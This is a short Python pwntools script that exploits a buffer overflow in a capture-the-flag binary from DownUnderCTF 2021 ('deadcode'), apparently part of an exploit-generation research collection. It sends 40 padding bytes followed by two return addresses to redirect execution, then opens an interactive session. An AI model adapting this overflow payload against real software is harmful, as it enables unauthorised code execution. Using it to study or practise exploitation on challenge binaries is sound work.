from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/bofaeg_challenges/12_downunderctf2021_deadcode/downunderctf2021_deadcode")
pwn.gdb.attach(p)
p.recvuntil(b"\nI'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.\n\nWhat features would you like to see in my app?\n")
payload = b"\x00" * 40
payload += p64(0x401016) + p64(0x4011ef)
payload += b"\n"
p.send(payload)
p.interactive()
